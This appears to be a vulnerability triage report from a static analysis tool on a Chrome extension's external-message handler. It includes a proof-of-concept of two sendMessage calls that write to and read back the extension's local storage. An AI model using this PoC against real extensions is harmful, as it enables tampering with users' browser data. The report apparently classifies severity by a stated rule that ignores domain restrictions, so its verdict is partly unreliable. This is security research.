# CoCo Analysis: lbmokfklpmlklngnbmfiafnaoncadldc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: bg_chrome_runtime_MessageExternal -> chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lbmokfklpmlklngnbmfiafnaoncadldc/opgen_generated_files/bg.js
Line 997: `chrome.storage.local.set({ ['checksum']: request.checksum });`

**Code:**

```javascript
// Background script - External message listener (bg.js line 991-1006)
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
  if (request === 'open_thank_you_page') {
    (async () => {
      await clstCheck();
    })();
  } else if (request.message === 'set_checksum') {
    chrome.storage.local.set({ ['checksum']: request.checksum }); // ← attacker-controlled
  } else if (request.message === 'validate_checksum') {
    chrome.storage.local.get(['checksum'], (data) => {
      fetch(`https://${config.domain}/wim/validate_checksum?checksum=${data.checksum}`);
      sendResponse(data.checksum); // ← sends stored value back to attacker
    });
  }
  return false;
});

// manifest.json declares externally_connectable
"externally_connectable": {
  "matches": [
    "https://*.secureshieldsearch.com/*"
  ]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any page on https://*.secureshieldsearch.com/*
// Attacker controls secureshieldsearch.com or a subdomain

// Step 1: Poison storage with malicious checksum
chrome.runtime.sendMessage(
  'lbmokfklpmlklngnbmfiafnaoncadldc',
  { message: 'set_checksum', checksum: 'malicious_value' },
  function(response) {
    console.log('Storage poisoned');
  }
);

// Step 2: Read back the stored value
chrome.runtime.sendMessage(
  'lbmokfklpmlklngnbmfiafnaoncadldc',
  { message: 'validate_checksum' },
  function(response) {
    console.log('Retrieved checksum:', response); // ← receives 'malicious_value'
  }
);
```

**Impact:** Complete storage exploitation chain. An attacker controlling any subdomain of secureshieldsearch.com can write arbitrary data to chrome.storage.local (storage poisoning) and then retrieve that data back via sendResponse, achieving a complete write-then-read exploitation cycle. While the domain is developer-controlled in theory, if ANY subdomain is compromised or allows attacker-controlled content, the vulnerability is exploitable. Per the methodology, we ignore manifest.json restrictions - if even ONE domain can exploit it, it's a TRUE POSITIVE.

---

## Sink 2: storage_local_get_source -> sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lbmokfklpmlklngnbmfiafnaoncadldc/opgen_generated_files/bg.js
Line 751: `var storage_local_get_source = { 'key': 'value' };`
Line 1000: `fetch(\`https://${config.domain}/wim/validate_checksum?checksum=${data.checksum}\`);`

**Note:** This is the same flow as Sink 1, just traced from the read side. The vulnerability is the complete chain: external message -> storage write -> storage read -> sendResponse back to attacker.

**Classification:** TRUE POSITIVE (duplicate of Sink 1)

**Reason:** Same vulnerability as Sink 1 - the complete storage exploitation chain where attacker can write to storage via 'set_checksum' and read back via 'validate_checksum' with sendResponse.

---

## Overall Summary

This extension has a **TRUE POSITIVE** vulnerability. The extension uses `chrome.runtime.onMessageExternal` to allow external websites (specifically `https://*.secureshieldsearch.com/*`) to communicate with it. The vulnerability manifests as a complete storage exploitation chain:

1. Attacker sends `set_checksum` message to poison storage
2. Attacker sends `validate_checksum` message to retrieve stored data
3. Extension sends the stored value back via `sendResponse`

Per the methodology, even though only specific domains are whitelisted in `externally_connectable`, if the code allows external messages and even ONE domain can exploit it, this is classified as TRUE POSITIVE. The attacker would need to control or compromise any subdomain of secureshieldsearch.com to exploit this.
